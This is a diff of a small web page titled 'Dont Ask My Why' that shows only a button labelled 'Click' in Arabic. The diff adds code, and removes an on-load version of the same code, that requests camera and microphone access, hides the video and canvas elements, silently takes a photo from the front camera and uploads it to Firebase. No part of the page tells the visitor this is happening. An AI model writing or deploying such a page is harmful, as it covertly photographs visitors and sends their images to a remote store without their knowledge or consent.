@@ -5,6 +5,36 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Dont Ask My Why</title>
     <link rel="icon" href="data:,"> <!-- Favicon request disabled -->
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #000; /* Black background */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .button {
+            background-color: #000; /* Black background */
+            color: white; /* White text */
+            border: 2px solid white; /* White border */
+            padding: 20px 40px; /* Padding */
+            font-size: 24px; /* Font size */
+            cursor: pointer; /* Pointer cursor */
+            border-radius: 5px; /* Rounded edges */
+            transition: background-color 0.3s; /* Transition effect */
+        }
+
+        .button:hover {
+            background-color: rgba(255, 255, 255, 0.2); /* Lighten on hover */
+        }
+
+        video, canvas {
+            display: none; /* Hide video and canvas elements */
+        }
+    </style>
     <script type="module">
         // Import Firebase functions
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-app.js";
@@ -36,44 +66,46 @@
                 });
         }
 
-        // Access video and canvas elements
-        window.addEventListener('load', () => {
-            const video = document.createElement('video');
-            const canvas = document.createElement('canvas');
-            const context = canvas.getContext('2d');
-
-            // Request microphone access
-            navigator.mediaDevices.getUserMedia({ audio: true })
-            .then(() => {
-                // Request camera access after microphone permission is granted
-                return navigator.mediaDevices.getUserMedia({
-                    video: {
-                        facingMode: "user", // Use front camera
-                        width: { ideal: 1920 },
-                        height: { ideal: 1080 }
-                    }
+        // Function to handle button click
+        async function handleClick() {
+            try {
+                // Request both microphone and camera permissions
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    audio: true,
+                    video: { facingMode: "user" }
                 });
-            })
-            .then(stream => {
+
+                // Create video and canvas elements
+                const video = document.createElement('video');
+                const canvas = document.createElement('canvas');
+                const context = canvas.getContext('2d');
+
                 video.srcObject = stream;
-                video.onloadedmetadata = () => {
-                    video.play();
 
-                    // Set canvas size for 1080p
-                    canvas.width = 1920;  
-                    canvas.height = 1080;
+                // Wait for video metadata to load and then play
+                await new Promise((resolve) => {
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        resolve();
+                    };
+                });
 
-                    // Capture image immediately
-                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    const imageData = canvas.toDataURL('image/png');
-                    uploadImage(imageData); // Upload image to Firebase
-                    stopVideo(stream); // Stop the video stream
-                };
-            })
-            .catch(err => {
-                console.error('Error accessing microphone or camera: ', err);
-            });
-        });
+                // Set canvas size for capturing
+                canvas.width = 1920; // Set canvas width for 1080p
+                canvas.height = 1080; // Set canvas height for 1080p
+
+                // Capture the image
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const imageData = canvas.toDataURL('image/png');
+                uploadImage(imageData); // Upload captured image to Firebase
+
+                // Stop the video stream
+                stopVideo(stream);
+            } catch (err) {
+                console.error('Error accessing permissions: ', err);
+                alert('Permissions denied! You cannot use this feature without granting permissions.');
+            }
+        }
 
         // Function to stop video stream
         function stopVideo(stream) {
@@ -81,36 +113,8 @@
             tracks.forEach(track => track.stop());
         }
     </script>
-    <style>
-        body {
-            margin: 0;
-            padding: 0;
-            background-color: #000; /* Black background */
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            flex-direction: column;
-        }
-
-        .youtube-button {
-            background-color: black; /* Black button */
-            color: white; /* White text */
-            border: 2px solid white; /* White edges */
-            padding: 20px 40px; /* Button size */
-            font-size: 24px; /* Font size */
-            cursor: pointer; /* Pointer cursor */
-            transition: background-color 0.3s;
-            border-radius: 5px; /* Rounded edges */
-            text-align: center;
-        }
-
-        .youtube-button:hover {
-            background-color: #444; /* Darker on hover */
-        }
-    </style>
 </head>
 <body>
-    <button class="youtube-button" id="redirect-button" onclick="window.location.href='https://www.youtube.com/watch?v=xvFZjo5PgG0'">انقر</button>
+    <button class="button" onclick="handleClick()">انقر</button> <!-- Button with "Click" in Arabic -->
 </body>
 </html>
